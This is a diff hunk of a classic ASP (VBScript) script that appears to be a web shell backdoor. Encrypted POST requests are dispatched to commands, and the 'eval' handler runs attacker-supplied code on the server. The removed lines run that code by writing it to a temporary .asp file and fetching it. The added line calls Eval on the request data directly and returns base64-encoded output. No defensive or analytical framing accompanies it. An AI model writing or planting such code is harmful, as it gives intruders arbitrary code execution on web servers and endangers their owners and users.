@@ -452,37 +452,7 @@ If method = "POST" And Session("aes_key") <> "" Then
         Case "echo"
             respJson = "{""echo"":" & JsonStr(data) & "}"
         Case "eval"
-            Dim cmdData, info, base64Info, tempFile, tempUrl
-            cmdData = "your hardcoded script here"
-
-            ' Generate random temp file in current path
-            Dim randName, currentPath, currentUrl
-            Randomize
-            randName    = "_tmp_" & Int(Rnd * 9000000 + 1000000) & ".asp"
-            currentPath = Left(Request.ServerVariables("SCRIPT_FILENAME"), InStrRev(Request.ServerVariables("SCRIPT_FILENAME"), "\"))
-            currentUrl  = "http://" & Request.ServerVariables("HTTP_HOST") & Left(Request.ServerVariables("SCRIPT_NAME"), InStrRev(Request.ServerVariables("SCRIPT_NAME"), "/"))
-            tempFile    = currentPath & randName
-            tempUrl     = currentUrl & randName
-
-            Dim fso, f
-            Set fso = CreateObject("Scripting.FileSystemObject")
-            Set f = fso.CreateTextFile(tempFile, True)
-            f.Write "<%@ Language=VBScript %>" & vbCrLf & "<% " & cmdData & " %>"
-            f.Close
-            Set f = Nothing
-
-            Dim http
-            Set http = Server.CreateObject("MSXML2.ServerXMLHTTP")
-            http.Open "GET", tempUrl, False
-            http.Send
-            info = http.responseText
-
-            fso.DeleteFile tempFile
-            Set fso = Nothing
-            Set http = Nothing
-
-            base64Info = Base64Encode(info)
-            resp = "{""eval"":""" & base64Info & """}"
+            respJson = "{""eval"":" & Base64Encode(Eval(data)) & "}"
         Case Else
             respJson = "{""error"":""unknown cmd""}"
     End Select
